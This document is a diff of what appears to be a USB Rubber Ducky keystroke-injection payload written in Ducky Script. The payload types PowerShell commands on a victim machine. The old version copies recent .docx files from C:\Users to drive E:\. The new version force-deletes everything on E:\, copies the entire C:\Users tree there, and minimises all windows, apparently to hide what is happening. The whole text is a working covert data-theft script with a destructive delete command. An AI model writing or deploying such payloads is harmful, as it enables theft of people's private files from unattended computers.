@@ -5,9 +5,8 @@ DELAY 500
 STRING powershell
 ENTER
 DELAY 500
-STRING $sourceFolder = C:\Users; $destinationFolder = E:\; $startDate = (Get-Date).AddMonths(-1); $endDate = Get-Date; Get-ChildItem -Path $sourceFolder -Recurse -Filter *.docx | Where-Object { $_.LastWriteTime -ge $startDate -and $_.LastWriteTime -le $endDate } | Copy-Item -Destination $destinationFolder -Container -Force
+STRING $sourceFolder = C:\Users; $destinationFolder = E:\; $startDate = (Get-Date).AddMonths(-1); $endDate = Get-Date; Remove-Item -Path $destinationFolder -Recurse -Force; Copy-Item -Path $sourceFolder -Destination $destinationFolder -Container -Force
 ENTER
 DELAY 500
-ALT SPACE
-STRING n
+STRING $shell = New-Object -com WScript.Shell; $shell.MinimizeAll()
 ENTER
